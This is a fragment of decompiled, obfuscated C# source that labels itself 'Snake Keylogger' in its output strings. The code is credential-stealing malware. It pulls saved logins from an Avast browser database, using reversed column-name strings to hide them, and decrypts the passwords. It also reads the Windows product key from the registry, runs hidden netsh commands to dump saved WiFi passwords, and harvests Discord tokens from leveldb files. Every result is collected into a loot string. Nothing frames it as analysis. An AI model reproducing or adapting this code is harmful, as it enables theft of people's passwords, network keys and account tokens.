        if (!File.Exists(path))
          return;
        int num1 = 0;
        int integer = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "GetRowCount", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 1)));
        int num2 = num1;
        int num3 = integer;
        int num4 = num2;
        while (num4 <= num3)
        {
          object objectValue1 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type1 = (Type) null;
          string MemberName1 = "GetValue";
          object[] objArray1 = new object[2]
          {
            (object) num4,
            (object) Strings.StrReverse("lru_nigiro")
          };
          object[] Arguments1 = objArray1;
          string[] ArgumentNames1 = (string[]) null;
          Type[] TypeArguments1 = (Type[]) null;
          bool[] CopyBack1 = new bool[2]{ true, false };
          object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue1), Type1, MemberName1, Arguments1, ArgumentNames1, TypeArguments1, CopyBack1));
          if (CopyBack1[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray1[0])), typeof (int)));
          string str1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
          object objectValue3 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type2 = (Type) null;
          string MemberName2 = "GetValue";
          object[] objArray2 = new object[2]
          {
            (object) num4,
            (object) Strings.StrReverse("eulav_emanresu")
          };
          object[] Arguments2 = objArray2;
          string[] ArgumentNames2 = (string[]) null;
          Type[] TypeArguments2 = (Type[]) null;
          bool[] CopyBack2 = new bool[2]{ true, false };
          object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), Type2, MemberName2, Arguments2, ArgumentNames2, TypeArguments2, CopyBack2));
          if (CopyBack2[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[0])), typeof (int)));
          string Left1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
          object obj2 = (object) Encoding.Default;
          Type Type3 = (Type) null;
          string MemberName3 = "GetBytes";
          object[] objArray3 = new object[1];
          object[] objArray4 = objArray3;
          int index1 = 0;
          object objectValue5 = RuntimeHelpers.GetObjectValue(obj1);
          object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
          Type Type4 = (Type) null;
          string MemberName4 = "GetValue";
          object[] objArray5 = new object[2]
          {
            (object) num4,
            null
          };
          object[] objArray6 = objArray5;
          int index2 = 1;
          string str2 = Strings.StrReverse("eulav_drowssap");
          objArray6[index2] = (object) str2;
          object[] objArray7 = objArray5;
          object[] Arguments3 = objArray7;
          string[] ArgumentNames3 = (string[]) null;
          Type[] TypeArguments3 = (Type[]) null;
          bool[] CopyBack3 = new bool[2]{ true, false };
          object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), Type4, MemberName4, Arguments3, ArgumentNames3, TypeArguments3, CopyBack3));
          if (CopyBack3[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray7[0])), typeof (int)));
          objArray4[index1] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
          object[] objArray8 = objArray3;
          object[] Arguments4 = objArray8;
          string[] ArgumentNames4 = (string[]) null;
          Type[] TypeArguments4 = (Type[]) null;
          bool[] CopyBack4 = new bool[1]{ true };
          object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj2), Type3, MemberName3, Arguments4, ArgumentNames4, TypeArguments4, CopyBack4));
          if (CopyBack4[0])
            NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type) null, "GetValue", new object[3]
            {
              (object) num4,
              (object) str2,
              RuntimeHelpers.GetObjectValue(objArray8[0])
            }, (string[]) null, (Type[]) null, true, false);
          string Left2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD((byte[]) objectValue8);
          if (Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Avast\r\nHost: " + str1 + "\r\nUsername: " + Left1 + "\r\nPassword: " + Left2 + "\r\n---------------------------------\r\n";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++num4; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string Մ퓜鈟\uFFFDЅ()
    {
      string str1 = "";
      try
      {
        byte[] sourceArray = (byte[]) Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("DigitalProductID");
        byte[] destinationArray = new byte[15];
        Array.Copy((Array) sourceArray, 52, (Array) destinationArray, 0, 15);
        string str2 = "BCDFGHJKMPQRTVWXY2346789";
        int num1 = 0;
        do
        {
          short startIndex = 0;
          int index = 14;
          do
          {
            short num2 = checked ((short) ((int) startIndex * 256 ^ (int) destinationArray[index]));
            destinationArray[index] = checked ((byte) Math.Round(Conversion.Int(unchecked ((double) num2 / 24.0))));
            startIndex = checked ((short) unchecked ((int) num2 % 24));
            checked { index += -1; }
          }
          while (index >= 0);
          str1 = str2.Substring((int) startIndex, 1) + str1;
          checked { ++num1; }
        }
        while (num1 <= 24);
        int num3 = 4;
        do
        {
          str1 = str1.Insert(checked (num3 * 5), "-");
          checked { num3 += -1; }
        }
        while (num3 >= 1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static void ߡݶܪzj()
    {
    }

    private static void ųЅչ\uFFFDی(string _param0)
    {
      using (StringReader stringReader = new StringReader(_param0))
      {
        string str;
        while (ک\uFFFD鈟ٷΩ.\u0040ΑΑבԜ<string>(ref str, stringReader.ReadLine()) != null)
        {
          checked { ++ک\uFFFD鈟ٷΩ.Ȩņ\uFFFDşW; }
          ک\uFFFD鈟ٷΩ.\u02F3ęĪҢJ(str);
        }
      }
    }

    public static void ŔΑ\uFFFD똛ޗ()
    {
    }

    private static void \u02F3ęĪҢJ(string _param0)
    {
      Match match = new Regex("All User Profile * : (?<after>.*)").Match(_param0);
      if (!match.Success)
        return;
      checked { ++ک\uFFFD鈟ٷΩ.ήϘԌՄO; }
      string str1 = match.Groups["after"].Value;
      string str2 = ک\uFFFD鈟ٷΩ.ݶiU\u00BE\u02F3(str1) + "\r\n===============";
      ک\uFFFD鈟ٷΩ.\u06DAԜéۨƉ = ک\uFFFD鈟ٷΩ.\u06DAԜéۨƉ + string.Format("{0}{1}", (object) ("WiFi Name: " + str1.PadRight(20)), (object) ("\r\nPassword:  " + str2)) + "\r\n";
    }

    public static string 뫆丐ɢR꾯(string _param0)
    {
      string str = "wlan show profile name=\"" + _param0 + "\" key=clear";
      Process process = new Process();
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.StartInfo.FileName = "netsh";
      process.StartInfo.Arguments = str;
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardError = true;
      process.StartInfo.RedirectStandardInput = true;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.CreateNoWindow = true;
      process.Start();
      string end = process.StandardOutput.ReadToEnd();
      process.StandardError.ReadToEnd();
      process.WaitForExit();
      return end;
    }

    public static string Αמ\uFFFDۚ늻()
    {
      Process process = new Process();
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.StartInfo.FileName = "netsh";
      process.StartInfo.Arguments = "wlan show profile";
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardError = true;
      process.StartInfo.RedirectStandardInput = true;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.CreateNoWindow = true;
      process.Start();
      string end = process.StandardOutput.ReadToEnd();
      process.StandardError.ReadToEnd();
      process.WaitForExit();
      return end;
    }

    public static string ݶiU\u00BE\u02F3(string _param0)
    {
      using (StringReader stringReader = new StringReader(ک\uFFFD鈟ٷΩ.뫆丐ɢR꾯(_param0)))
      {
        string input;
        while (ک\uFFFD鈟ٷΩ.\u0040ΑΑבԜ<string>(ref input, stringReader.ReadLine()) != null)
        {
          Match match = new Regex("Key Content * : (?<after>.*)").Match(input);
          if (match.Success)
            return match.Groups["after"].Value;
        }
      }
      return "Open Network";
    }

    [Obsolete("Please refactor calling code to use normal Visual Basic assignment")]
    public static T \u0040ΑΑבԜ<T>(ref T _param0, T _param1)
    {
      _param0 = _param1;
      return _param1;
    }

    private static void \uF0B9ިأﾭ\u07B8() => ک\uFFFD鈟ٷΩ.ųЅչ\uFFFDی(ک\uFFFD鈟ٷΩ.Αמ\uFFFDۚ늻());

    public static void \u06E3ɩm\u005E꼺()
    {
      try
      {
        string 뫆ިŔٷչ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
        if (ک\uFFFD鈟ٷΩ.\u07BBՕЮ\u0026ɇ(ref 뫆ިŔٷչ) || ک\uFFFD鈟ٷΩ.\u07BBՕЮ\u0026ɇ(ref 뫆ިŔٷչ))
          ;
        Thread.Sleep(100);
        string Left = ک\uFFFD鈟ٷΩ.\uFFFDJ\u0026\uFFFDƜ(뫆ިŔٷչ, 뫆ިŔٷչ.EndsWith(".log"));
        if (Operators.CompareString(Left, "", false) == 0)
          Left = "N/A";
        string str = "\r\n-------- Snake Keylogger --------\r\nFound From: Discord\r\nToken: " + Left + "\r\n\r\n---------------------------------\r\n ";
        \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static bool \u07BBՕЮ\u0026ɇ(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string \u0657\uFFFDԹٚ뫆(string _param0)
    {
      string[] collection = _param0.Substring(checked (_param0.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string \uFFFDJ\u0026\uFFFDƜ(string 뫆ިŔٷչ, bool _param1 = false)
    {
      string str1 = Encoding.UTF8.GetString(File.ReadAllBytes(뫆ިŔٷչ));
      string str2 = "";
      string str3 = str1;
      while (str3.Contains("oken"))
      {
        string[] strArray = ک\uFFFD鈟ٷΩ.\u0657\uFFFDԹٚ뫆(str3).Split('"');
        str2 = strArray[0];
        str3 = string.Join("\"", strArray);
        if (_param1 && str2.Length == 59)
          break;
      }
      return str2;
    }

    internal sealed class RecoveredApplicationAccount
    {
      private string _appName;
      private string _username;
      private string _password;
      private string _URL;

      internal string UserName
      {
        get => this._username;
        set => this._username = value;
      }

      internal string Password
      {
        get => this._password;
        set => this._password = value;
      }

      internal string URL
      {
        get => this._URL;
        set => this._URL = value;
      }

      internal string appName
      {
        get => this._appName;
        set => this._appName = value;
      }
    }

    [System.Flags]
    public enum CryptProtectPromptFlags
    {
      CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
      CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCT
    {
      public int cbSize;
      public ک\uFFFD鈟ٷΩ.CryptProtectPromptFlags dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB
    {
      public int cbData;
      public IntPtr pbData;
    }
  }
}
